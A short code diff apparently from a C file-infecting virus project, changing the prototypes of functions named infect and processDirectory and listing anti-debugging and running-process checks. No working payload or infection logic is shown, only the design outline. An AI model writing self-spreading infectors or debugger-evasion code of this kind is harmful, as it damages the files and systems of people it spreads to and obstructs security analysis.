@@ -69,9 +69,10 @@ struct timezone
 /*
 void clean(t_file file);
 */
-static void infect(char *path, void *begin_ptr, char *ALPHA, size_t OMEGA);
-static void processDirectory(char *folder, void *begin_ptr, char *ALPHA,
-							 size_t OMEGA);
+static void infect(char *path, void *begin_ptr, char *curare, size_t flower,
+				   char *ALPHA, size_t OMEGA);
+static void processDirectory(char *folder, void *begin_ptr, char *curare,
+							 size_t flower, char *ALPHA, size_t OMEGA);
 
 static int is_program_running(const char *target);
 static int is_debugged(void);
